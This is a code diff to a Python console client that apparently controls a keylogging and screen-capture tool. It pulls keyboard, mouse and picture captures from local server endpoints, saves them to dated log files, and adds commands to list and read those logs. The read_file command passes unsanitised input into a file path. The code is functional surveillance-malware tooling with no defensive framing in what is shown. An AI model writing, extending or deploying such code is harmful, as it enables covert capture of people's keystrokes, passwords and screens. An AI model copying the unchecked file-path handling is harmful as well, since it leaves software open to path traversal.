@@ -1,35 +1,61 @@
 from app._client import Client_socket as csock
 from app.functions import redirect_output
-import asyncio, subprocess, time, queue, threading, requests
+import asyncio, subprocess, time, queue, threading, requests, os, datetime
 
 URLl = 'http://localhost:3000/give_me_my_data'
 threads_done = threading.Event()
 
 def update_log():
     """ Update log file """
+    log_directory = "./log"
+    if not os.path.exists(log_directory):
+        os.makedirs(log_directory)
+        
+    now = datetime.datetime.now()
+    format_date = str(now.strftime("%d_%m_%Y"))
     
     print("update log...")
     print("generate keyboard log...")
     time.sleep(1)
     response_keyboard = requests.get("http://localhost:3000/give_me_my_keyboard")
-    with open("./log_keyboard.txt", "a") as file:
+    with open("./log/log_keyboard_{}.log".format(str(format_date)), "a") as file:
         file.write(str(response_keyboard.content)+"\n")
         print(str(response_keyboard.content)+"\n")
         
     time.sleep(1)    
     print("generate mouse log...")
     response_mouse = requests.get("http://localhost:3000/give_me_my_mouse")
-    with open("./log_mouse.txt", "a") as file:
+    with open("./log/log_mouse_{}.log".format(str(format_date)), "a") as file:
         file.write(str(response_mouse.content)+"\n")
         print(str(response_mouse.content)+"\n")
         
     time.sleep(1)    
     print("generate picture log...")
     response_picture = requests.get("http://localhost:3000/give_me_my_picture")
-    with open("./log_picture.txt", "a") as file:
+    with open("./log/log_picture_{}.log".format(str(format_date)), "a") as file:
         file.write(str(response_picture.content)+"\n")
         print(str(response_picture.content)+"\n")
     time.sleep(1)    
+    
+def show_files():
+    """ Show files in log folder """
+    try:
+        pathl = "./log"
+        contenu_dossier = os.listdir(pathl)
+        files = [f for f in contenu_dossier if os.path.isfile(os.path.join(pathl, f))]
+    
+        print("---- :", files)
+    except:
+        print("\n[!] - Log folder is empty\n")
+        
+def read_file(filename):
+    """ Read file """
+    
+    try:
+        with open("./log/{}".format(filename), "r") as file:
+            print(file.read())
+    except:
+        print("Can't read file {}".format(filename))
 class client:
     """ Main client class """
     
@@ -54,8 +80,9 @@ class client:
             if not await generate_csock.ainit(): raise Exception()
             
             
-            
-            print("Server started is running now: Press 'help' for more information\n") 
+            print('\n---- [ONLY ON SERVER - SHOW (show log files) - READ_FILE [FILENAME] (read file) - INTERPT_LOG ] ----\n')
+            print("> Server started is running now: Press 'help' for more information\n") 
+           
             while True:
                 while True:
                     if subprocess.Popen.poll(server) != None:# Forced restart if the server is closed by ? entity
@@ -73,16 +100,18 @@ class client:
                                 print(line)
                                 line = None
                         else:break
-                inpt = input("Press enter to send a message\n--").upper()
-                if inpt == "a".upper() :update_log()
+                inpt = input("> Press enter to send a message\n\n--").upper()
+                read_files = inpt.split(' ')
+                if "show".upper() in inpt: 
+                    show_files()
+                elif "read_file".upper() == read_files[0]: #prendre un fichier en compte
+                    print("Read file")
+                    read_file(read_files[1])
+                elif "interpt_log".upper() in inpt:update_log()
                 elif inpt == "stop":break
-                await generate_csock.send(message=inpt)
-                print("\n---------------------\n")
-                #Give var if none => rien
-                
-                
-            #run server multiprocess
-            #Run while 
+                else:
+                    await generate_csock.send(message=inpt)
+                    print("\n---------------------\n")
             
         except: 
             time.sleep(5)
